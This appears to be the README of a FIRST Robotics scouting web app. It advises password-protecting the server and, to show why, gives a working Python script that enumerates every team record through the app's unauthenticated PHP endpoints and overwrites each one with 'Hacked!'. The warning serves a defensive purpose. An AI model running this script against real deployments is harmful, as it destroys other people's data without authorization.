# FRCScoutingWebApp
Server ready scouting app. I'd recommend you password protect the domain (It's pretty easy to wipe out all server data by modifying scripts).

Incase you wanted to know how to wipe the database. I'd suggest you password protect because a simple script like this will wipe it all out.

```python
import requests
import json
import sys

url = str(sys.argv[1])
url1 = "http://"+url+"/php/getAllTeams.php"
url2 = "http://"+url+"/php/setTeamInfo.php?q="
text = requests.get(url1).text
text = text.replace(",,", ",").replace("[,", "[").replace(",]", "]")

while text.find(",,") != -1 or text.find("[,") != -1 or text.find(",]") != -1:
    text = text.replace(",,", ",").replace("[,", "[").replace(",]", "]")

data = json.loads(text)

for i in data:
    requests.post(url2+str(i["Number"]), data={'data':'Hacked!'})

```
